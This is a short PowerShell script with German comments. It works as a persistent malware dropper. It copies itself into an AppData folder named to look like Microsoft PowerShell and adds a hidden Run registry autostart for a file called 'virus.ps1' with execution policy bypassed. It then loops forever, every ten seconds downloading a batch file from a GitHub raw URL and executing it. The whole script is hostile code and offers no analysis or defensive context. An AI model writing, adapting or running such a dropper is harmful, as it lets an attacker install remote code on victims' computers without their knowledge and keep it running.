# Zielpfad, in den das Repository kopiert wird
$TargetPath = "$env:USERPROFILE\AppData\Local\Programs\Microsoft-Powershell"
# Pfad zum Registrierungsschl�ssel
$RegKeyPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
# Name des Registrierungswerts
$ValueName = "MyStartupScript"
# Daten f�r den Registrierungswert
$ValueData = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$TargetPath\virus.ps1`""

# Intervall f�r die �berpr�fung in Sekunden (z.B. alle 5 Minuten)
$checkInterval = 10
#Url zu den Github Dateien
$url = "https://raw.githubusercontent.com/Samuitl/New-Test/main/start.bat"
# �berpr�fen und Erstellen des Zielpfads
if (-not (Test-Path -Path $TargetPath)) {
    New-Item -Path $TargetPath -ItemType Directory -Force
}
# Kopieren des eigenen Skriptes in das Zielverzeichnis
$ScriptContents = $MyInvocation.MyCommand.ScriptContents
$ScriptContents | Out-File -FilePath "$TargetPath\MyCopy.ps1" -Encoding utf8
# Funktion zum Herunterladen und Ausf�hren des Files
function DownloadAndExecuteFile {
    # Herunterladen des Files
    Invoke-WebRequest -Uri $url -OutFile "$TargetPath\start.bat" -ErrorAction SilentlyContinue
    # �berpr�fen, ob das File erfolgreich heruntergeladen wurde
    if (Test-Path "$TargetPath\start.bat") {
        # Ausf�hren des heruntergeladenen Files
        & "$TargetPath\start.bat"
    }
}
# Einrichten des Autostart-Eintrags
try {
    Get-ItemProperty -Path $RegKeyPath -Name $valueName -ErrorAction Stop
} catch [System.Management.Automation.ItemNotFoundException] {
    New-Item -Path $RegKeyPath -Force
    New-ItemProperty -Path $RegKeyPath -Name $ValueName -Value $ValueData -Force
} catch {
    New-ItemProperty -Path $RegKeyPath -Name $ValueName -Value $ValueData -Type String -Force
}
# Schleife f�r die regelm��ige Ausf�hrung
while ($true) {
    DownloadAndExecuteFile
    Start-Sleep -Seconds $checkInterval
}